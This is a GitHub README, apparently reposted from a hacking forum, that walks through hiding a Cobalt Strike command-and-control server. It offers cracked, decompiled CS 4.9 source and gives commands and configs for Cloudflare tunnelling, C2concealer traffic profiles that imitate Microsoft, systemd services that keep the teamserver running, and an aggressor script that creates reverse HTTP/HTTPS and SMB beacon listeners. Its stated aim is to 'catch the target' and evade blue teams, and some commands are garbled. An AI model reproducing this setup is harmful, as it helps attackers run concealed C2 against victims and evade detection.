# Hide-CobaltStrike
<h2 align="center">Hide your CobaltStrike PRO</h2> 
<p align="center">

<h4 align="center"></h4>
<p align="center">
Hide Your CobaltStrike with CloudFlared Tunnel and Microsoft 100 Traffic%

I finally see a new CobaltStrike audience here (I wish everyone good luck), and I was waiting for the administrator to allow us to publish some materials about CS in the last competition.. In this way, all the people here could learn how to use it properly; and now we must focus on hiding ourselves as much as possible when using this tool, complicating it and connecting like a professional!

The source code attached at the end of Cobaltstrike 4.9 is decompiled cs4.9. There were many holes among them, mainly due to the problem of compilation errors caused by syntax errors in the decompiled code. Manually changed most of the syntax errors caused by decompilation. A small part of the location code changes are more complex, and annotation processing is performed directly, and the original jar function is called for implementation, and this does not affect the use of the function. If you want to change the position during the second opening, you can uncomment and change the position code to implement the second opening.
</p>

```
-XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:hook.jar
```

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/1.png" 
<p align="center">

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/2.png" 
<p align="center">

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/3.png" 
<p align="center">

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/4.png" 
<p align="center">

Now I will have 2 ways to hide your beacon (c2) like a professional; this is the last use of the hide your (c2) function and mix your traffic so that it is more difficult to catch your c2, and secondly, it is important to know, and not all people who start using CS know which tool use it to hide yourself from wireshark and the blue team.;

to work with (c2) in general using empire; or c2, you need these important 3 things;
- Profile - for example: google.com , Amazon, microsoft.com etc.
- Your IP/host/domain
- The lighthouse is online!

Argo Tunnel Client:

Contains a command-line client for the Argo tunnel, a tunneling daemon that proxies any local web server through the Cloudflare network. Extensive documentation can be found in the "Argo Tunnel" section of the Cloudflare docs.

Before you get started:
Before using the Argo tunnel, you need to follow a few steps on the Cloudflare dashboard. The website that you add to Cloudflare will be used to route traffic into your tunnel.

```
https://support.cloudflare.com/hc/en-us/articles/201720164-Creating-a-Cloudflare-account-and-adding-a-website
```

Let's go through all the old techniques to hide your beacon using domain redirectors, etc. Now we will publish how to make your beacon "worthless"!

We need to complete these hidden 3 things;
- cloudflare - tunnel
- ding argo -
- cobalt strike 4.x internet penetration tool

```
./teamserver.sh ip-адрес  microsoft.profile
```

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/cs-start.png" 
<p align="center">

our gun is loaded and listening to us using Microsoft.profile

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/4_started.png" 
<p align="center">

nstalling cloudflare is also as easy as you can imagine! to install packages .deb just run; Debian / Ubuntu

// Ubuntu, Linux Mint

```
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
dpkg -i cloudflared-linux-amd64.deb
cloudflared status
```

// CentOS, Fedora, RHEL

```
wget -q https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.rpm
rpm -ivh cloudflared-stable-linux-amd64.rpm
```

// Docker

```
https://hub.docker.com/r/cloudflare/cloudflared
docker run cloudflare/cloudflared:2020.7.0 tunnel --no-autoupdate --hello-world
```

// macOS

```
$ brew install cloudflare/cloudflare/cloudflared
```

```
cloudflared tunnel --url 127.0.0.1:31337
```

cloudflare has now completed the assignment of our private cobalt strike tunnel; ( https://assisted-same -*******.trycloudflare.com ); let's map our inner port to catch the target;

```
./ding -config=./ding.cfg -subdomain=r1z 31337
```

bing for windows/linux/mac OS

```
https://github.com/open-dingtalk/pierced/tree/master/linux
```

now the important part; what we did here with the cloudflare listener, we need to do with your ding or any alternative mapping tool; let's get the cloudflare address and prepare our tunnel;


now configure our listener for the cloudflared IP address and our internal port 31337

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/listener_cloudflared.png" 
<p align="center">

Let's connect our beacon to the network!

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/generate.png" 
<p align="center">

Online!

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Hide-CobaltStrike/blob/main/img/connect.png" 
<p align="center">

Now don't forget that our beacon is combined between the cloudflare tunnel & C2concealer profile (Microsoft) where it will show the client our IP address located in cloudflare, and the wireshark tunnel shows microsoft; to prepare the C2concealer profile in the east, as far as you can imagine;

just follow the repo here https://github.com/FortyNorthSecurity/C2concealer or run the following commands;

C2 concealer is a python 3 command line tool that creates flexible c2 profiles for use with Cobalt Strike, Do you want to get up and running fast?

Usage Example :

```
Usage:
$ c2concealer --hostname google.com --variant 3

Flags:

(optional)
--hostname
The hostname used in HTTP client and server side settings. Default is None.
--variant
An integer defining the number of HTTP client/server variants to generate. Recommend between 1 and 5. Max 10.
```

Output to the console:

```
git clone https://github.com/FortyNorthSecurity/C2concealer
chmod u+x install.sh
./install.sh
```

You will need to select the SSL option. When you run it for the first time, just select "4" to understand how the tool works. Option "2" requires you to set the A record for the domain you manage and point it to the IP address of the machine on which you are running the tool. This is because the tool will download certbot and automatically launch the ACME protocol using LetsEncrypt to create a certificate for use in on-the-fly evaluation. Option "3" requires a path to the keystore (you can fill in this path on the tab).

After selecting the SSL option, the tool should simply output the verification results and save the profile file in the current working directory.

Configuring c2concealer:

The best way to use this tool is to make it your own by adding additional and/or other values to the default dictionaries and data lists.

The tool is structured in such a way that it allows users to change the default data attributes in several places. First, you will find several files in the /c2concealer/data/ subdirectory.py containing lists and dictionaries of default values. Jump in there and change whatever you see fit.

```
dns.py (setting up dns subdomains)
file_type_prepend.py (customize the appearance of the http get server responses... it's also the c2 management instructions)
params.py (two dictionaries containing common parameter names and a common list of words)
post_ex.py (the list of spawn_to processes...definitely change this one)
reg_headers.py (typical http headers such as user agent and server)
smb.py (smb channel names to use when sending messages via SMS)
stage.py (data for changing locks related to the scene)
transform.py (transformations payload data...no need to change this)
urls.py (the file types and URL path components used to create URLs throughout the tool...definitely change that)
```

Secondly,
you can customize various attributes throughout the profile creation process. As an example, in the file: "/c2concealer/components/stageblock.py ", you can change the range from which the PE image size value is taken (about lines 73-74). Please review all the different files in the component catalog.

If I don't want to add my own values?

Everything is in perfect order. It will still generate random profiles every time. Eventually, AV vendors can browse the repository and create signatures based on these default values, but for now you should be fine.

the best option #2 for Let's encrypt free SSL with microsoft.com network activity to silently hide our c2 host.

-- Launching the Cobalstrike Teamserver as a service

These scripts can be used as a template for configuring team server as a service and autorun listeners.
These scenarios have been tested on an Ubuntu server and will need to be adjusted depending on your use case.

For cloudflare; we need to create this file to automatically start the service on reboot:
BE SURE to UPDATE the service files according to your environment.

Copy the service files to your team's server and specify to fix the location according to your server;

- teamserver.service
- listener.service
- listener_service.cna
- cloudflared.service
- cloudflared

```
/etc/systemd/system/teamserver.service
/etc/systemd/system/listener.service
/etc/systemd/system/cloudflared.service
/etc/your-cobaltstrike-location/listener_service.cna
/etc/default/cloudflared
```

sudo nano /etc/default/cloudflared

```
COBALTSTRIKE_DSAS_INJECT.DEV=--port 5353 --upstream https://1.1.1.1/dns-query --upstream https://1.0.0.1/dns-query
```

sudo nano /etc/systemd/system/cloudflared.service

```
[Unit]
Description=cloudflared DNS over HTTPS proxy
After=syslog.target network-online.target

[Service]
Type=simple
User=cloudflared
EnvironmentFile=/etc/default/cloudflared
ExecStart=/usr/local/bin/cloudflared proxy-dns $COBALTSTRIKE_R1Z_XSS.IS
Restart=on-failure
RestartSec=10
KillMode=process

[Install]
WantedBy=multi-user.target
```

Enable the systemd service to run at startup, then start the service and check its status:

Register new services

```
systemclt daemon-reload
```

Start the services

```
ystemctl start teamserver.service
systemctl start listener.service
systemctl start cloudflared.service
```

check the services

```
sudo systemctl enable cloudflared
sudo systemctl status cloudflared sudo systemctl status teamserver.service
```

// Team server Service

Update the settings to suit your environment.
Working directory: installed in the cobalt strike directory
ExecStart: Set your values

```
# teamserver.service
[Unit]
Description=Cobalt Strike Teamserver Service & Argo tunnel service! 
After=network.target
Wants=network.target

[Service]
Type=Simple
WorkingDirectory=/your-cobaltstrike-location
ExecStart=/opt/your-cobaltstrike-location/teamserver <TEAMSERVER IP> <PASSWORD> <PATH TO C2 PROFILE>

# Example
# ExecStart=/opt/your-cobaltstrike-location/teamserver hostname -I thisismypassword /opt/cobaltstrike/c2.profile

[Install]
WantedBy=multi-user.target
```

Listening Service

Update the settings to suit your environment.

Working directory: installed in the cobalt strike directory
ExecStart: Set your values

```
# listener.service
[Unit]
Description=Cobalt Strike aggressor service & argo Tunnel service! xss.is
After=teamserver.service network.target
Wants=teamserver.service
StartLimitIntervalSec=33

[Service]
Restart=on-failure
RestartSec=10
WorkingDirectory=/your-cobaltstrike-location
ExecStartPre=/bin/sleep 60
ExecStart=/bin/bash /opt/your-cobaltstrike-location/agscript 127.0.0.1 50050 <USER to LOGON TO COBALTSTRIKE> <TEAMSERVER PASSWORD> <PATH TO listener_service.cna>

# Example
# ExecStart=/bin/bash /opt/your-cobaltstrike-location/agscript 127.0.0.1 50050 listener_service thisismypassword /opt/cobaltstrike/listener_service.cna

[Install]
WantedBy=multi-user.target
```

The scenario of a headless aggressor

This should be updated to reflect your environment.

This example of an aggressor script is used to launch an HTTP, HTTPS, and SMB listener with all the necessary parameters

HTTP Listener

- Name
- Listening host
- althost

HTTPS Listener

- Name
- Listening host
- althost

SMB Listener

```
println("
###################################################################
 CobaltStrike Aggressor Script         
 Author:      Joe Vest
 Description: Headless script to create listeners
###################################################################");

println('Loading listener_service.cna...');

on ready{
    println('listener_service.cna: Creating HTTP Listener...');
    listener_create_ext("HTTP", "windows/beacon_http/reverse_http", %(host => "iheartredteams.com", port => 80, beacons => "iheartredteams.com", althost => "iheartredteams.com", bindto => 80));

    println('listener_service.cna: Creating HTTPS Listener...');
    listener_create_ext("HTTPS", "windows/beacon_https/reverse_https", %(host => "iheartredteams.com", port => 443, beacons => "iheartredteams.com", althost => "iheartredteams.com", bindto => 443));

    println('listener_service.cna: Creating SMB Listener...');
    listener_create_ext("SMB", "windows/beacon_bind_pipe", %(port => "mojo.5887.8051.34782273429370473##"));
    sleep(10000);
}
```

### THE NOTE
This article is for informational purposes only. We do not encourage you to commit any hacking. Everything you do is your responsibility.

TOX : 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72 Telegram : @DevSecAS
